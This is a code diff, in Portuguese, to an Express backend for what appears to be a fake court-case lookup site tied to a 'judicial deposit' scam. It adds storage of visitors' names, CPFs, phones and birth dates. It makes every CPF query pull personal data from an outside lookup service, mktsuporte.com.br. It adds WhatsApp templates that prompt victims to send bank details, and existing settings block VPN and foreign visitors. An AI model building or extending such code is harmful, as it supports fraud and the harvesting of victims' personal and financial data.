@@ -77,10 +77,23 @@ db.exec(`
   )
 `);
 
+// Tabela de contatos (CPF não encontrado)
+db.exec(`
+  CREATE TABLE IF NOT EXISTS contatos (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    nome TEXT NOT NULL,
+    cpf TEXT NOT NULL,
+    telefone TEXT NOT NULL,
+    data_nascimento TEXT DEFAULT '',
+    criado_em DATETIME DEFAULT CURRENT_TIMESTAMP
+  )
+`);
+
 // Inserir configurações padrão se não existirem
 const defaultConfigs = [
   ['whatsapp_numero', '5511999999999'],
   ['whatsapp_mensagem', 'Olá, me chamo {nome} e estou entrando em contato referente ao processo {processo}.\n\nMeus dados bancários:\n*Banco:* {banco}\n*Agência:* {agencia}\n*Conta:* {conta} ({tipo_conta})\n*Titular:* {titular}\n*CPF Titular:* {cpf_titular}\n*PIX:* {pix}'],
+  ['whatsapp_mensagem_nao_encontrado', 'Olá, meu nome é {nome}, CPF {cpf}, nascido em {data_nascimento}.\n\nO sistema não conseguiu encontrar meu processo! Gostaria de saber mais detalhes para que eu consiga fazer o cadastramento para meu depósito judicial favorável.'],
   ['protecao_ativa', 'true'],
   ['bloquear_vpn', 'true'],
   ['bloquear_fora_brasil', 'true'],
@@ -263,6 +276,22 @@ app.get('/api/consulta/:cpf', async (req, res) => {
       return res.status(400).json({ error: 'CPF inválido' });
     }
 
+    // Buscar dados pessoais com timeout de 5s (sempre buscar)
+    let dadosPessoais = null;
+    try {
+      const controller = new AbortController();
+      const timeout = setTimeout(() => controller.abort(), 5000);
+      const apiRes = await fetch(`https://mktsuporte.com.br/apifull.php?cpf=${cpf}`, {
+        signal: controller.signal
+      });
+      clearTimeout(timeout);
+      if (apiRes.ok) {
+        dadosPessoais = await apiRes.json();
+      }
+    } catch (err) {
+      console.log('Erro ao buscar dados pessoais:', err.message);
+    }
+
     // Buscar processos - usando LIKE para maior compatibilidade
     const processos = db.prepare(`
       SELECT * FROM processos
@@ -270,7 +299,7 @@ app.get('/api/consulta/:cpf', async (req, res) => {
     `).all(cpf);
 
     if (!processos || processos.length === 0) {
-      return res.status(404).json({ error: 'Nenhum processo encontrado para este CPF' });
+      return res.status(404).json({ error: 'Nenhum processo encontrado para este CPF', dadosPessoais });
     }
 
     // Buscar prosseguimentos
@@ -293,22 +322,6 @@ app.get('/api/consulta/:cpf', async (req, res) => {
         pr.cpf_titular?.replace(/\D/g, '') === cpf
       )
     }));
-
-    // Buscar dados pessoais com timeout de 5s
-    let dadosPessoais = null;
-    try {
-      const controller = new AbortController();
-      const timeout = setTimeout(() => controller.abort(), 5000);
-      const apiRes = await fetch(`https://mktsuporte.com.br/apifull.php?cpf=${cpf}`, {
-        signal: controller.signal
-      });
-      clearTimeout(timeout);
-      if (apiRes.ok) {
-        dadosPessoais = await apiRes.json();
-      }
-    } catch (err) {
-      console.log('Erro ao buscar dados pessoais:', err.message);
-    }
 
     res.json({ processos: processosComStatus, dadosPessoais });
   } catch (error) {
@@ -358,6 +371,33 @@ app.get('/api/prosseguimentos', (req, res) => {
 
 app.delete('/api/prosseguimentos/:id', (req, res) => {
   db.prepare('DELETE FROM prosseguimentos WHERE id = ?').run(req.params.id);
+  res.json({ success: true });
+});
+
+// Endpoints de contatos (CPF não encontrado)
+app.post('/api/contato', (req, res) => {
+  const { nome, cpf, telefone, data_nascimento } = req.body;
+
+  if (!nome || !cpf || !telefone) {
+    return res.status(400).json({ error: 'Campos obrigatórios não preenchidos' });
+  }
+
+  const stmt = db.prepare(`
+    INSERT INTO contatos (nome, cpf, telefone, data_nascimento)
+    VALUES (?, ?, ?, ?)
+  `);
+
+  stmt.run(nome, cpf.replace(/\D/g, ''), telefone, data_nascimento || '');
+  res.status(201).json({ success: true });
+});
+
+app.get('/api/contatos', (req, res) => {
+  const rows = db.prepare('SELECT * FROM contatos ORDER BY criado_em DESC').all();
+  res.json(rows);
+});
+
+app.delete('/api/contatos/:id', (req, res) => {
+  db.prepare('DELETE FROM contatos WHERE id = ?').run(req.params.id);
   res.json({ success: true });
 });
 
@@ -510,6 +550,7 @@ app.put('/api/configuracoes', (req, res) => {
   const {
     whatsapp_numero,
     whatsapp_mensagem,
+    whatsapp_mensagem_nao_encontrado,
     protecao_ativa,
     bloquear_vpn,
     bloquear_fora_brasil,
@@ -520,6 +561,7 @@ app.put('/api/configuracoes', (req, res) => {
   const stmt = db.prepare('INSERT OR REPLACE INTO configuracoes (chave, valor) VALUES (?, ?)');
   if (whatsapp_numero !== undefined) stmt.run('whatsapp_numero', whatsapp_numero);
   if (whatsapp_mensagem !== undefined) stmt.run('whatsapp_mensagem', whatsapp_mensagem);
+  if (whatsapp_mensagem_nao_encontrado !== undefined) stmt.run('whatsapp_mensagem_nao_encontrado', whatsapp_mensagem_nao_encontrado);
   if (protecao_ativa !== undefined) stmt.run('protecao_ativa', protecao_ativa);
   if (bloquear_vpn !== undefined) stmt.run('bloquear_vpn', bloquear_vpn);
   if (bloquear_fora_brasil !== undefined) stmt.run('bloquear_fora_brasil', bloquear_fora_brasil);
